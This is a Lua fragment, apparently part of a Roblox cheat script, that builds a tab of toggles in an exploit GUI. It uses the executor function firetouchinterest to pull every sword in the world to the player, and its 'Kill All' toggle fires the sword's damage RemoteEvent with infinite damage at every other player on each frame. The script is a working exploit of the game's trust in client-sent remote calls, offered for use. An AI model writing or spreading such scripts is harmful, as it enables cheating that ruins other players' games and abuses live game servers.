-- === TOGGLES TAB ===
togglesTab:CreateLabel("Automation & Toggles", "")
local lastGrabTime = 0
togglesTab:CreateToggle("Grab All Tools", false, function()
    grabAllToolsEnabled = not grabAllToolsEnabled
    if grabAllToolsEnabled then
        if _G.grabToolsConnection then _G.grabToolsConnection:Disconnect() end
        _G.grabToolsConnection = game:GetService("RunService").Heartbeat:Connect(function()
            if os.clock() - lastGrabTime < 0.1 then return end 
            lastGrabTime = os.clock()

            local char = game.Players.LocalPlayer.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                for _, obj in pairs(workspace:GetDescendants()) do
                    if obj:IsA("Tool") and obj.Name == "sword" and obj:FindFirstChild("Handle") and obj.Handle:FindFirstChildOfClass("TouchTransmitter") then
                        firetouchinterest(char.HumanoidRootPart, obj.Handle, 0)
                        task.wait()
                        firetouchinterest(char.HumanoidRootPart, obj.Handle, 1)
                    end
                end
            end
        end)
    else
        if _G.grabToolsConnection then
            _G.grabToolsConnection:Disconnect()
            _G.grabToolsConnection = nil
        end
    end
end)

togglesTab:CreateButton("Drop All Tools", function()
    for _, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        if tool:IsA("Tool") then
            tool.CanBeDropped = true
            tool.Parent = game.Players.LocalPlayer.Character
            tool.Parent = workspace
        end
    end
end)

togglesTab:CreateToggle("Kill All", false, function()
    killAllEnabled = not killAllEnabled
    if _G.killAllConnection then _G.killAllConnection:Disconnect(); _G.killAllConnection = nil end
    if killAllEnabled then
        _G.killAllConnection = game:GetService("RunService").Heartbeat:Connect(function()
            local player = game.Players.LocalPlayer
            local sword = player.Character and (player.Character:FindFirstChild("sword") or player.Backpack:FindFirstChild("sword"))
            local dmg = sword and sword.Handle and sword.Handle:FindFirstChild("dmg") and sword.Handle.dmg.RemoteEvent
            if not dmg then return end
            for _, p in pairs(game:GetService("Players"):GetPlayers()) do
                if p ~= player and p.Character then
                    local h = p.Character:FindFirstChild("Humanoid")
                    if h and h.Health > 0 then pcall(dmg.FireServer, dmg, h, math.huge) end
                end
            end
        end)
    end
end)


